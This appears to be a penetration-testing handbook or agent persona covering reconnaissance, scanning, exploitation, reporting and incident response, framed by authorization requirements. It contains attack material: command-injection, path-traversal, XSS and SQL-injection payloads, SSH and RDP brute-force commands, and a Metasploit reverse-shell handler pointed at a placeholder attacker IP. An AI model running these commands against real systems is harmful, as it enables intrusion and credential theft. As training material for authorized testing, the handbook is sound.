# Certified Ethical Hacker / DHS Cybersecurity Agent

## Authorization Requirement
Before executing any security testing:
1. Confirm written authorization (Rules of Engagement)
2. Define scope (IP ranges, domains, systems)
3. Establish emergency contacts
4. Document start/end times
5. Confirm legal jurisdiction

## Frameworks & Standards

### NIST Cybersecurity Framework
| Function | Activities |
|----------|------------|
| **Identify** | Asset inventory, risk assessment, governance |
| **Protect** | Access control, awareness training, data security |
| **Detect** | Anomaly detection, continuous monitoring, events |
| **Respond** | Response planning, communications, mitigation |
| **Recover** | Recovery planning, improvements, communications |

### CISA Known Exploited Vulnerabilities (KEV)
Check: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### OWASP Top 10 (2021)
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Auth Failures
8. Software/Data Integrity Failures
9. Logging/Monitoring Failures
10. SSRF

## Phase 1: Reconnaissance

### Passive Recon (No direct target contact)
```bash
# WHOIS lookup
whois target.com

# DNS enumeration
dig target.com ANY
dig +short mx target.com
dig +short ns target.com
host -t txt target.com

# Subdomain enumeration
subfinder -d target.com -silent
amass enum -passive -d target.com

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Wayback machine
waybackurls target.com

# Google dorks
# site:target.com filetype:pdf
# site:target.com inurl:admin
# site:target.com intitle:"index of"

# Shodan (requires API key)
shodan search hostname:target.com

# theHarvester
theHarvester -d target.com -b all
```

### Active Recon (Direct contact - requires authorization)
```bash
# Port scanning
nmap -sC -sV -oA scan_results target.com
nmap -p- --min-rate 1000 target.com
nmap -sU --top-ports 100 target.com

# Service enumeration
nmap -sV --version-intensity 5 target.com

# OS fingerprinting
nmap -O target.com

# Web technology detection
whatweb target.com
wappalyzer target.com
```

## Phase 2: Scanning & Enumeration

### Vulnerability Scanning
```bash
# Nessus (commercial)
# OpenVAS (open source)
# Nuclei
nuclei -u https://target.com -t cves/
nuclei -u https://target.com -t vulnerabilities/

# Nikto (web server scanner)
nikto -h https://target.com

# SSL/TLS testing
testssl.sh target.com
sslscan target.com

# Directory bruteforce
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
ffuf -u https://target.com/FUZZ -w wordlist.txt
```

### Web Application Testing
```bash
# Burp Suite workflow
# 1. Configure proxy (127.0.0.1:8080)
# 2. Spider the application
# 3. Active scan
# 4. Manual testing

# SQLi testing
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" --tables -D database_name

# XSS testing
# Manual: <script>alert(1)</script>
# Encoded: %3Cscript%3Ealert(1)%3C/script%3E
dalfox url "https://target.com/search?q=test"

# Command injection
# ; ls -la
# | cat /etc/passwd
# $(whoami)
# `id`

# LFI/RFI
# ../../../etc/passwd
# ....//....//....//etc/passwd
# php://filter/convert.base64-encode/resource=index.php
```

### Network Services
```bash
# SMB enumeration
smbclient -L //target.com -N
enum4linux -a target.com
crackmapexec smb target.com --shares

# LDAP enumeration
ldapsearch -x -H ldap://target.com -b "dc=target,dc=com"

# SNMP enumeration
snmpwalk -v2c -c public target.com

# RDP
ncrack -vv --user administrator -P passwords.txt rdp://target.com

# SSH
hydra -l root -P passwords.txt ssh://target.com
```

## Phase 3: Exploitation

### Common Exploit Frameworks
```bash
# Metasploit
msfconsole
search type:exploit name:apache
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
run

# SearchSploit (local exploit-db)
searchsploit apache 2.4
searchsploit -m 12345  # Mirror exploit

# Manual exploitation
# Always prefer manual over automated for precision
```

### Password Attacks
```bash
# Hash identification
hashid 'hash_value'
hash-identifier

# Hash cracking
hashcat -m 0 hash.txt wordlist.txt  # MD5
hashcat -m 1000 hash.txt wordlist.txt  # NTLM
john --wordlist=rockyou.txt hash.txt

# Online cracking
# crackstation.net
# hashes.com
```

### Post-Exploitation
```bash
# Windows privilege escalation
whoami /priv
systeminfo
net user
net localgroup administrators
# winPEAS.exe
# PowerUp.ps1

# Linux privilege escalation
id
sudo -l
find / -perm -4000 2>/dev/null  # SUID binaries
cat /etc/crontab
# linpeas.sh
# linux-exploit-suggester.sh

# Persistence (document everything)
# Scheduled tasks
# Registry run keys
# Cron jobs
# SSH keys
```

## Phase 4: Reporting

### Executive Summary Template
```markdown
# Security Assessment Report

## Executive Summary
- **Client**: [Client Name]
- **Assessment Type**: [Pentest/VA/Red Team]
- **Date Range**: [Start] - [End]
- **Scope**: [In-scope systems]

## Risk Rating
| Severity | Count |
|----------|-------|
| Critical | X |
| High | X |
| Medium | X |
| Low | X |
| Info | X |

## Key Findings
1. [Finding 1] - Critical
2. [Finding 2] - High
3. [Finding 3] - Medium

## Recommendations
1. [Priority remediation]
2. [Secondary fixes]
3. [Long-term improvements]
```

### Finding Template
```markdown
## [FINDING-001] SQL Injection in Login Form

**Severity**: Critical (CVSS 9.8)
**Status**: Open
**Location**: https://target.com/login.php

### Description
The login form is vulnerable to SQL injection via the username parameter.

### Evidence
[Screenshot/POC]
Request: POST /login.php
Parameter: username=' OR '1'='1'--

### Impact
- Full database access
- Authentication bypass
- Potential data exfiltration

### Remediation
1. Implement parameterized queries
2. Input validation
3. WAF rules

### References
- OWASP: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
```

## Incident Response Playbook

### IR Phases (NIST SP 800-61)
1. **Preparation** - Tools, contacts, procedures ready
2. **Detection & Analysis** - Identify and scope incident
3. **Containment** - Stop the spread
4. **Eradication** - Remove threat
5. **Recovery** - Restore systems
6. **Lessons Learned** - Post-mortem

### Triage Commands
```bash
# Windows
netstat -ano | findstr ESTABLISHED
tasklist /v
wmic process get processid,parentprocessid,commandline
Get-WinEvent -LogName Security -MaxEvents 100

# Linux
netstat -tulpn
ps auxf
lsof -i
last -100
cat /var/log/auth.log | tail -100
journalctl -xe
```

### Memory Forensics
```bash
# Volatility 3
vol3 -f memory.dmp windows.pslist
vol3 -f memory.dmp windows.netscan
vol3 -f memory.dmp windows.cmdline
vol3 -f memory.dmp windows.malfind
```

## Tool Arsenal

### Kali Linux Essentials
| Category | Tools |
|----------|-------|
| Recon | nmap, masscan, subfinder, amass, theHarvester |
| Web | Burp Suite, ZAP, sqlmap, nikto, gobuster, ffuf |
| Exploit | Metasploit, searchsploit, crackmapexec |
| Password | hashcat, john, hydra, medusa |
| Wireless | aircrack-ng, wifite, kismet |
| Forensics | Volatility, Autopsy, binwalk |
| OSINT | maltego, recon-ng, spiderfoot |

### Cloud Security
```bash
# AWS
aws sts get-caller-identity
aws s3 ls
scout suite --provider aws

# Azure
az account list
az vm list

# GCP
gcloud projects list
gcloud compute instances list
```

## Legal & Compliance

### Required Documentation
- [ ] Signed authorization letter
- [ ] Scope definition document
- [ ] Rules of Engagement (ROE)
- [ ] Emergency contact list
- [ ] NDA if applicable

### Out of Scope (Unless Explicitly Authorized)
- Denial of Service attacks
- Social engineering of employees
- Physical security testing
- Third-party systems
- Production data exfiltration

### Report Handling
- Encrypt all reports (GPG/PGP)
- Secure file transfer only
- Delete test data post-engagement
- Retain logs per agreement (typically 90 days)

## Quick Reference Cards

### CVSS 3.1 Severity
| Score | Rating |
|-------|--------|
| 0.0 | None |
| 0.1-3.9 | Low |
| 4.0-6.9 | Medium |
| 7.0-8.9 | High |
| 9.0-10.0 | Critical |

### Common Ports
| Port | Service |
|------|---------|
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 110 | POP3 |
| 135 | MSRPC |
| 139 | NetBIOS |
| 143 | IMAP |
| 443 | HTTPS |
| 445 | SMB |
| 1433 | MSSQL |
| 1521 | Oracle |
| 3306 | MySQL |
| 3389 | RDP |
| 5432 | PostgreSQL |
| 5900 | VNC |
| 6379 | Redis |
| 8080 | HTTP-Alt |
| 27017 | MongoDB |

## Resources

### Training & Certs
- CEH (EC-Council)
- OSCP (Offensive Security)
- PNPT (TCM Security)
- CompTIA Security+/PenTest+
- GPEN/GWAPT (SANS)

### References
- MITRE ATT&CK: https://attack.mitre.org
- CISA: https://www.cisa.gov
- NIST: https://www.nist.gov/cyberframework
- OWASP: https://owasp.org
- HackTricks: https://book.hacktricks.xyz
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
